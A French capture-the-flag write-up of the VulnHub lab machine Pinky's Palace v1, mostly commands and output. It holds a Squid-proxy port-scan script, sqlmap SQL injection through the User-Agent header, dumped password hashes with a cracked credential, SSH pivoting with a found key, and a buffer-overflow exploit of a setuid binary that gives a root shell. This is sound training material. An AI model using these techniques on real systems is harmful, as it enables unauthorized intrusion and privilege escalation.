---
title: "Solution du CTF Pinky's Palace v1 de VulnHub"
tags: [CTF, VulnHub]
---

Publié en mars 2018, [Pinky's Palace: v1](https://vulnhub.com/entry/pinkys-palace-v1,225/) est le premier d'une série de 4 CTFs. On aura ici une exploitation web nécessitant un peu d'intuition (ou de chance) ainsi que de l'exploitation de binaire en mode débutant.

## Unusual ports are unusual

```
Nmap scan report for 192.168.56.183
Host is up (0.00041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
8080/tcp  open  http       nginx 1.10.3
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: nginx/1.10.3
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
31337/tcp open  http-proxy Squid http proxy 3.5.23
|_http-server-header: squid/3.5.23
| vulners: 
|   cpe:/a:squid-cache:squid:3.5.23: 
|       CVE-2020-11945  7.5     https://vulners.com/cve/CVE-2020-11945
|       CVE-2019-12526  7.5     https://vulners.com/cve/CVE-2019-12526
|       CVE-2019-12525  7.5     https://vulners.com/cve/CVE-2019-12525
|       CVE-2019-12519  7.5     https://vulners.com/cve/CVE-2019-12519
|       CVE-2020-15049  6.5     https://vulners.com/cve/CVE-2020-15049
|       CVE-2019-12523  6.4     https://vulners.com/cve/CVE-2019-12523
|       CVE-2019-18677  5.8     https://vulners.com/cve/CVE-2019-18677
|       CVE-2021-28651  5.0     https://vulners.com/cve/CVE-2021-28651
|       CVE-2020-25097  5.0     https://vulners.com/cve/CVE-2020-25097
|       CVE-2020-14058  5.0     https://vulners.com/cve/CVE-2020-14058
|       CVE-2019-18679  5.0     https://vulners.com/cve/CVE-2019-18679
|       CVE-2019-18678  5.0     https://vulners.com/cve/CVE-2019-18678
|       CVE-2019-18676  5.0     https://vulners.com/cve/CVE-2019-18676
|       CVE-2018-1000024        5.0     https://vulners.com/cve/CVE-2018-1000024
|       CVE-2019-12529  4.3     https://vulners.com/cve/CVE-2019-12529
|       CVE-2019-12521  4.3     https://vulners.com/cve/CVE-2019-12521
|       CVE-2021-31807  4.0     https://vulners.com/cve/CVE-2021-31807
|       MSF:AUXILIARY-DOS-HTTP-SQUID_RANGE_DOS- 0.0     https://vulners.com/metasploit/MSF:AUXILIARY-DOS-HTTP-SQUID_RANGE_DOS-  *EXPLOIT*
|_      CVE-2021-46784  0.0     https://vulners.com/cve/CVE-2021-46784
64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
```

L'auteur fait tourner les services habituels, mais sur des ports customs. J'ai énuméré dans tous les sens le Nginx sans rien trouver à part des erreurs `403` donc de toute évidence le proxy Squid sera notre sauveur.

Déjà on peut profiter des réponses différentes que produit le Squid quand on lui demande de se connecter à un port fermé, port refusé ou qu'un contenu est retourné :

```python
import requests
from requests.exceptions import RequestException

proxies = {
  'http': 'http://192.168.56.183:31337/',
}
session = requests.Session()
session.proxies.update(proxies)

for port in range(1, 65536):
    try:
        resp = session.get(f"http://127.0.0.1:{port}/")
        if "ERR_CONNECT_FAIL" in resp.text or "ERR_ACCESS_DENIED" in resp.text:
            continue

        print(f"Port {port} seems open")
        print(resp.text)
        print("="*30)
    except RequestException as error:
        print(f"Error when testing port {port}: {error}")
```

Mon script utilise le proxy pour tenter de forwarder une requête HTTP vers chacun des 65535 ports de localhost. Voici l'output :

```console
$ python3 proxy_scan.py 
Port 3306 seems open
b
5.5.5-10.1.26-MariaDB-0+deb9u1r&`7-|KBÿ÷-? G|^?_Cp*~\52mysql_native_password!ÿ„#08S01Got packets out of order
==============================
Port 8080 seems open
<html>
        <head>
                <title>Pinky's HTTP File Server</title>
        </head>
        <body>
                <center><h1>Pinky's HTTP File Server</h1></center>
                <center><h3>Under Development!</h3></center>
        </body>
<style>
html{
        background: #f74bff;
}
</html>

==============================
Port 31337 seems open
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<meta type="copyright" content="Copyright (C) 1996-2015 The Squid Software Foundation and contributors">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>ERROR: The requested URL could not be retrieved</title>
--- snip ---
</head><body id=ERR_INVALID_URL>
<div id="titles">
<h1>ERROR</h1>
<h2>The requested URL could not be retrieved</h2>
</div>
<hr>
--- snip ---

==============================
Port 45904 seems open
GET / HTTP/1.1
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate, br
Accept: */*
Host: 127.0.0.1:45904
Via: 1.1 pinkys-palace (squid/3.5.23)
X-Forwarded-For: 192.168.56.1
Cache-Control: max-age=259200
Connection: keep-alive


==============================
Port 55064 seems open
GET / HTTP/1.1
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate, br
Accept: */*
Host: 127.0.0.1:55064
Via: 1.1 pinkys-palace (squid/3.5.23)
X-Forwarded-For: 192.168.56.1
Cache-Control: max-age=259200
Connection: keep-alive


==============================
Port 64666 seems open
SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u2
Protocol mismatch.

==============================
```

Étonnamment, deux ports semblent nous retourner notre requête... Il s'avèrera plus tard que ce sont des faux positifs, aucun serveur n'écoutait sur ces ports.

Dans tous les cas, on peut accéder au port 8080 sans se faire éjecter :

```console
$ curl -x http://192.168.56.183:31337/ http://127.0.0.1:8080/
<html>
        <head>
                <title>Pinky's HTTP File Server</title>
        </head>
        <body>
                <center><h1>Pinky's HTTP File Server</h1></center>
                <center><h3>Under Development!</h3></center>
        </body>
<style>
html{
        background: #f74bff;
}
</html>
```

J'ai testé différentes wordlists pour l'énumération et finalement, c'est celle de DirBuster qui a permit de trouver un dossier :

```bash
feroxbuster -u http://127.0.0.1:8080/ --proxy http://192.168.56.183:31337/ -w DirBuster-0.12/directory-list-2.3-big.txt -n
```

```
301        7l       12w      185c http://127.0.0.1:8080/littlesecrets-main
```

## Surprise Motherfucker

Sous ce path on trouve une page de login. Un test d'injection manuel n'a rien remonté de suspect, mais j'ai tout de même lancé un sqlmap et je l'ai laissé tourné sans trop m'en soucier.

```bash
python sqlmap.py -u http://127.0.0.1:8080/littlesecrets-main/login.php --data "user=admin&pass=admin" --proxy http://192.168.56.183:31337/ --risk 3 --level 5
```

Et à la surprise générale :

```
[15:18:11] [INFO] parameter 'User-Agent' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

Faux positif ? En énumérant les bases de données il s'est avéré que la faille était véridique. J'ai donc énuméré les tables liées à la base courante :

```
Database: pinky_sec_db
[2 tables]
+-------+
| logs  |
| users |
+-------+
```

Il y a deux hashes dans la table `users` :

```
Database: pinky_sec_db
Table: users
[2 entries]
+-----+----------------------------------+-------------+
| uid | pass                             | user        |
+-----+----------------------------------+-------------+
| 1   | f543dbfeaf238729831a321c7a68bee4 | pinky       |
| 2   | d60dffed7cc0d87e1f4a11aa06ca73af | pinkymanage |
+-----+----------------------------------+-------------+
```

Le second hash est indexé par _crackstation.net_. Les identifiants `pinkymanage` / `3pinkysaf33pinkysaf3` ne permettent pas la connexion sur le site web, mais sont acceptés sur SSH.

Petite remarque : on pouvait aussi trouver via énumération un fichier `logs.php` dans le même dossier web et qui affichait le User-Agent pour chaque tentative de connexion. Cela servait d'indice pour nous mettre sur la piste de l'injection dans l'entête HTTP.

## Gimme a R, Gimme a E, Gimme a T

Dans le dossier web, je trouve deux fichiers dont un caché qui contient du base64.

```console
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main$ ls ultrasecretadminf1l35/
total 16K
drwxr-xr-x 2 root root 4.0K Feb  2  2018 .
drwxr-xr-x 3 root root 4.0K Feb  2  2018 ..
-rw-r--r-- 1 root root   99 Feb  2  2018 note.txt
-rw-r--r-- 1 root root 2.3K Feb  2  2018 .ultrasecret
```

Le fichier texte a le message suivant :

> Hmm just in case I get locked out of my server I put this rsa key here.. Nobody will find it heh..

On peut passer de `pinkymanage` à `pinky` via cette clé SSH :

```console
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cat .ultrasecret | base64 -d > ~/ssh.key
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ chmod 600 ~/ssh.key
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ ssh -p 64666 -i ~/ssh.key pinky@127.0.0.1
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb  2 05:54:01 2018 from 172.19.19.2
pinky@pinkys-palace:~$ id
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
pinky@pinkys-palace:~$ ls -l
total 16
-rwsr-xr-x 1 root root 8880 Feb  2  2018 adminhelper
-rw-r--r-- 1 root root  280 Feb  2  2018 note.txt
```

`pinky` a donc un binaire setuid root dans son dossier personnel avec le message suivant :

> Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my print  
> ing skills because Im not sure how to implement shell spawning yet :(

Une analyse rapide du binaire montre que la fonction `main` est vulnérable à un buffer overflow (utilisation de `strcpy` avec `argv[1]`).

Mais il y a aussi une fonction nommée `spawn` qui donne un shell root mais qui n'est pas appelée.

```nasm
pinky@pinkys-palace:~$ gdb -q ./adminhelper
Reading symbols from ./adminhelper...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x817
(gdb) r
Starting program: /home/pinky/adminhelper 

Breakpoint 1, 0x0000555555554817 in main ()
(gdb) disass main
Dump of assembler code for function main:
   0x0000555555554813 <+0>:     push   %rbp
   0x0000555555554814 <+1>:     mov    %rsp,%rbp
=> 0x0000555555554817 <+4>:     sub    $0x50,%rsp
   0x000055555555481b <+8>:     mov    %edi,-0x44(%rbp)
   0x000055555555481e <+11>:    mov    %rsi,-0x50(%rbp)
   0x0000555555554822 <+15>:    cmpl   $0x2,-0x44(%rbp)
   0x0000555555554826 <+19>:    jne    0x55555555484e <main+59>
   0x0000555555554828 <+21>:    mov    -0x50(%rbp),%rax
   0x000055555555482c <+25>:    add    $0x8,%rax
   0x0000555555554830 <+29>:    mov    (%rax),%rdx
   0x0000555555554833 <+32>:    lea    -0x40(%rbp),%rax
   0x0000555555554837 <+36>:    mov    %rdx,%rsi
   0x000055555555483a <+39>:    mov    %rax,%rdi
   0x000055555555483d <+42>:    callq  0x555555554640 <strcpy@plt>
   0x0000555555554842 <+47>:    lea    -0x40(%rbp),%rax
   0x0000555555554846 <+51>:    mov    %rax,%rdi
   0x0000555555554849 <+54>:    callq  0x555555554650 <puts@plt>
   0x000055555555484e <+59>:    mov    $0x0,%eax
   0x0000555555554853 <+64>:    leaveq 
   0x0000555555554854 <+65>:    retq   
End of assembler dump.
(gdb) disass spawn
Dump of assembler code for function spawn:
   0x00005555555547d0 <+0>:     push   %rbp
   0x00005555555547d1 <+1>:     mov    %rsp,%rbp
   0x00005555555547d4 <+4>:     sub    $0x10,%rsp
   0x00005555555547d8 <+8>:     movl   $0x0,-0x4(%rbp)
   0x00005555555547df <+15>:    movl   $0x0,-0x8(%rbp)
   0x00005555555547e6 <+22>:    mov    -0x4(%rbp),%eax
   0x00005555555547e9 <+25>:    mov    %eax,%edi
   0x00005555555547eb <+27>:    callq  0x555555554680 <seteuid@plt>
   0x00005555555547f0 <+32>:    mov    -0x8(%rbp),%eax
   0x00005555555547f3 <+35>:    mov    %eax,%edi
   0x00005555555547f5 <+37>:    callq  0x555555554670 <setegid@plt>
   0x00005555555547fa <+42>:    mov    $0x0,%edx
   0x00005555555547ff <+47>:    mov    $0x0,%esi
   0x0000555555554804 <+52>:    lea    0xd9(%rip),%rdi        # 0x5555555548e4
   0x000055555555480b <+59>:    callq  0x555555554660 <execve@plt>
   0x0000555555554810 <+64>:    nop
   0x0000555555554811 <+65>:    leaveq 
   0x0000555555554812 <+66>:    retq   
End of assembler dump.
```

Le binaire n'a pas de protection contre les buffer overflows. NX n'est même pas activé :

```console
$ checksec --file adminhelper
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   adminhelper
```

J'ai déterminé qu'il fallait 72 octets avant d'écraser l'adresse de retour. Ensuite on va simplement placer l'adresse de `spawn` pour détourner l'exécution normale du binaire :

```console
pinky@pinkys-palace:~$ ./adminhelper `python2 -c 'print("A" * 72 + "\xd0\x47\x55\x55\x55\x55\x00\x00")'`
-bash: warning: command substitution: ignored null byte in input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�GUUUU
# id
uid=1000(pinky) gid=1000(pinky) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(pinky)
# cd /root
# ls
root.txt
# cat root.txt
===========[!!!CONGRATS!!!]===========

[+] You r00ted Pinky's Palace Intermediate!
[+] I hope you enjoyed this box!
[+] Cheers to VulnHub!
[+] Twitter: @Pink_P4nther

Flag: 99975cfc5e2eb4c199d38d4a2b2c03ce
```


